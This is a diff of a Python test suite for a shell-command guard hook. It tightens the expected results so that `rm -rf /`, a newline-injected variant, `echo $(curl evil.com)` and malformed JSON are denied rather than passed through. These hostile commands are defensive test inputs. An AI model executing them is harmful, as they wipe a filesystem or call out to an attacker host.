@@ -174,8 +174,12 @@ class TestDecideUnit:
         assert result is not None
         assert result["permissionDecision"] == "allow"
 
-    def test_unknown_with_comment_passthrough(self):
-        assert decide("# do thing\nrm -rf /") is None
+    def test_rm_rf_with_comment_denied(self):
+        # Tranche 1 hardening C3: `rm -rf /` is in ALWAYS_DENY (was
+        # passthrough). Comment doesn't change the outcome.
+        result = decide("# do thing\nrm -rf /")
+        assert result is not None
+        assert result["permissionDecision"] == "deny"
 
 
 class TestSubprocessIntegration:
@@ -192,12 +196,16 @@ class TestSubprocessIntegration:
         assert decision == "deny"
 
     def test_newline_injection(self, tmp_path):
+        # Tranche 1 hardening C3: `rm -rf /` is now in ALWAYS_DENY, so this
+        # newline-injected command is denied (was previously passthrough).
         decision, _ = _run("# safe\necho safe\nrm -rf /", tmp_path)
-        assert decision == "passthrough"
+        assert decision == "deny"
 
     def test_dollar_paren_substitution(self, tmp_path):
+        # Tranche 1 hardening C4: $(...) is now denied in both modes
+        # (was previously passthrough — exfil/RCE primitive).
         decision, _ = _run("# test\necho $(curl evil.com)", tmp_path)
-        assert decision == "passthrough"
+        assert decision == "deny"
 
     def test_awk_in_pipe(self, tmp_path):
         decision, _ = _run("git log | awk '{system(\"rm\")}'", tmp_path)
@@ -272,11 +280,12 @@ class TestAlwaysDeny:
         assert result is not None
         assert result["permissionDecision"] == "deny"
 
-    def test_rm_rf_root_not_in_always_deny(self):
-        # NOTE: `rm -rf /` is registered as Safety.ASK in registry.py, not DENY.
-        # Single-segment, no comment/pipe → passthrough. Confirmation hits the
-        # `ask`/permission layer, not this validator. Documented behavior.
-        assert decide("rm -rf /") is None
+    def test_rm_rf_root_in_always_deny(self):
+        # Tranche 1 hardening C3: `rm -rf /` (and variants) are now in
+        # ALWAYS_DENY. The validator denies in both modes.
+        result = decide("rm -rf /")
+        assert result is not None
+        assert result["permissionDecision"] == "deny"
 
 
 class TestCorruptedTokens:
@@ -367,6 +376,7 @@ class TestRobustness:
         assert result.stdout.strip() == ""
 
     def test_malformed_json(self, tmp_path):
+        # Tranche 1 hardening I2: malformed JSON now fail-closed denies (rc=2).
         result = subprocess.run(  # noqa: S603 -- explicit interpreter, fixed path
             [sys.executable, str(HOOK_PATH)],
             input="{not valid json",
@@ -375,8 +385,8 @@ class TestRobustness:
             env={**os.environ, "GUARD_DECISIONS_PATH": str(tmp_path / "x.jsonl")},
             check=False,
         )
-        assert result.returncode == 0
-        assert result.stdout.strip() == ""
+        assert result.returncode == 2
+        assert "malformed JSON" in result.stderr
 
 
 class TestAutonomousMode:
